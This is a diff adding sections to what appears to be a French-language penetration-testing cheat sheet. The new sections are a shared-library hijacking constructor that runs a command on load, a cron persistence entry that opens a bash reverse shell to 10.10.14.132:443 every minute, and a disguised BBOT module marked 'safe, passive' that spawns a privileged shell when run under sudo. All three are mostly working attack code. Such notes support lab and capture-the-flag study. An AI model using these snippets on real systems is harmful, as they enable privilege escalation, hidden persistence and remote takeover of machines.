@@ -452,3 +452,76 @@ print(r.text)
 ```
 
 ***
+
+## C Library hijacking
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+// Constructeur : s'exécute au chargement de la bibliothèque
+__attribute__((constructor)) void malicious_init() {
+    // Code malveillant ici
+    system("whoami > /tmp/hijack_proof.txt");
+    // L'application continue normalement après
+}
+
+// Fonctions légitimes pour maintenir la compatibilité
+int legitimate_function() {
+    return 0;
+}
+
+gcc -x c -shared -fPIC -o ./libxcb.so.1
+```
+
+***
+
+## Cronjob Persistance
+
+{% code fullWidth="true" %}
+```
+Quality of Life Improvements
+Establish Persistence
+crontab -l 2>/dev/null > /tmp/crontab.txt
+echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.132/443 0>&1'" >> /tmp/crontab.txt
+crontab /tmp/crontab.txt
+Now, if you lose your reverse shell, you don't need to go through the process of uploading your module. You can just wait for the next crontab to run (every minute) and catch a new reverse shell.
+```
+{% endcode %}
+
+***
+
+## BBOT personlized modules abuse with Pyton
+
+```
+from bbot.modules.base import BaseModule
+import pty
+import os
+
+class systeminfo_enum(BaseModule):
+    watched_events = []
+    produced_events = []
+    flags = ["safe", "passive"]
+    meta = {"description": "System Info Recon (actually spawns root shell)"}
+
+    async def setup(self):
+        self.hugesuccess("📡 systeminfo_enum setup called — launching shell!")
+        try:
+            pty.spawn(["/bin/bash", "-p"])
+        except Exception as e:
+            self.error(f"❌ Shell failed: {e}")
+        return True
+```
+
+```
+sudo /usr/local/bin/bbot -t dummy.com -p /home/graphasm/preset.yml --event-types ROOT
+```
+
+```
+description: System Info Recon Scan
+module_dirs:
+  - .
+modules:
+  - systeminfo_enum
+```
